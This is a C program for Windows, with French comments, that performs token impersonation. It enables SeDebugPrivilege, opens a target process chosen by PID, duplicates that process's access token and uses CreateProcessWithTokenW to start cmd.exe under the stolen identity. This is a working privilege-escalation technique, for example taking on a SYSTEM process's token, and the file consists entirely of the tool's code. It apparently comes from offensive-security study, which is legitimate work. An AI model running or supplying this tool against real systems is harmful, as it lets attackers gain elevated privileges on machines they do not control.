/*
* RUBEN WIHLER
* 03.06.2023
*/

#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "advapi32.lib")

#define COLOR_RED     "\x1b[31m"
#define COLOR_GREEN   "\x1b[32m"
#define COLOR_CYAN    "\x1b[36m"
#define COLOR_RESET   "\x1b[0m"

BOOL EnablePrivileges(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
	TOKEN_PRIVILEGES token_privileges;
	LUID local_unique_id;

	// recuperation de l'identifiant local du privilege
	if (!LookupPrivilegeValue(NULL, lpszPrivilege, &local_unique_id))
	{
		printf("%s la recuperation de l'identifiant local du privilege a echouee, erreur: %u\n%s", COLOR_RED, GetLastError(), COLOR_RESET);
		return FALSE;
	}

	//preparation de la structure TOKEN_PRIVILEGES
	token_privileges.PrivilegeCount = 1;
	token_privileges.Privileges[0].Luid = local_unique_id;

	if (bEnablePrivilege) 
	{
		// activation du privilege
		token_privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	}
	else 
	{
		// desactivation du privilege
		token_privileges.Privileges[0].Attributes = 0;
	}

	// application du privilege
	if (!AdjustTokenPrivileges(hToken, FALSE, &token_privileges, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		printf("%s l'application du privilege a echouee, erreur: %u\n%s", COLOR_RED, GetLastError(), COLOR_RESET);
		return FALSE;
	}

	printf("%s [+] l'action sur le privilege a ete effectuee avec succes !\n%s", COLOR_GREEN, COLOR_RESET);

	return TRUE;
}

int main(int argc, char* argv[])
{
	if (argc < 2) {
		printf("%s [-] format : program.exe <PID> %s", COLOR_RED, COLOR_RESET);
		return EXIT_FAILURE;
	}

	DWORD pid =  atoi(argv[1]);

	HANDLE hToken = NULL;
	HANDLE hTokenDub = NULL;
	HANDLE hCurrentToken = NULL;
	STARTUPINFO startup_information;
	PROCESS_INFORMATION process_information;

	ZeroMemory(&startup_information, sizeof(STARTUPINFO));
	ZeroMemory(&process_information, sizeof(PROCESS_INFORMATION));
	startup_information.cb = sizeof(STARTUPINFO);
	
	// recuperation du token du processus courant
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hCurrentToken))
	{
		printf("%s [-] la recuperation du token du processus courant a echouee, erreur: %u\n%s", COLOR_RED, GetLastError(), COLOR_RESET);
		return EXIT_FAILURE;
	}

	// activation du privilege SE_DEBUG_NAME
	if (!EnablePrivileges(hCurrentToken, SE_DEBUG_NAME, TRUE)) {
		printf("%s [-] l'activation du privilege SE_DEBUG_NAME a echouee, erreur: %u\n%s", COLOR_RED, GetLastError(), COLOR_RESET);
		return EXIT_FAILURE;
	}

	// recuperation du token du processus a impersoner
	HANDLE hProcessResult = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
	if (hProcessResult == NULL) {
		printf("%s [-] la recuperation du processus a impersoner a echouee, erreur: %u\n%s", COLOR_RED, GetLastError(), COLOR_RESET);
		return EXIT_FAILURE;
	}

	if (!OpenProcessToken(hProcessResult, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
		printf("%s [-] la recuperation du token du processus a impersoner a echouee, erreur: %u\n%s", COLOR_RED, GetLastError(), COLOR_RESET);
		return EXIT_FAILURE;
	}

	if (!ImpersonateLoggedOnUser(hToken)) {
		printf("%s [-] l'impersonation du token a echouee, erreur: %u\n%s", COLOR_RED, GetLastError(), COLOR_RESET);
		return EXIT_FAILURE;
	}

	// duplication du token
	DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hTokenDub);

	//creation du processus avec le token duplique
	BOOL bProcessCreationResult = CreateProcessWithTokenW(
		hTokenDub,
		LOGON_WITH_PROFILE,
		L"C:\\Windows\\System32\\cmd.exe",
		NULL,
		0,
		NULL,
		NULL,
		&startup_information,
		&process_information);

	if (!bProcessCreationResult) {
		printf("%s [-] la creation du processus a echouee, erreur: %u\n%s", COLOR_RED, GetLastError(), COLOR_RESET);
		return EXIT_FAILURE;
	}

	printf(
		"%s [+] Informations : \n"
		"  PID : %d\n"
		"  Handle du processus : %d\n"
		"  Handle du thread : %d\n%s",
		COLOR_CYAN,
		process_information.dwProcessId,
		process_information.hProcess,
		process_information.hThread,
		COLOR_RESET);

	// liberation des ressources
	CloseHandle(hToken);
	CloseHandle(hTokenDub);
	CloseHandle(hCurrentToken);
	CloseHandle(hProcessResult);
	CloseHandle(process_information.hProcess);
	CloseHandle(process_information.hThread);


	printf("%s [+] le processus a ete cree avec succes\n%s", COLOR_GREEN, COLOR_RESET);

	return EXIT_SUCCESS;
}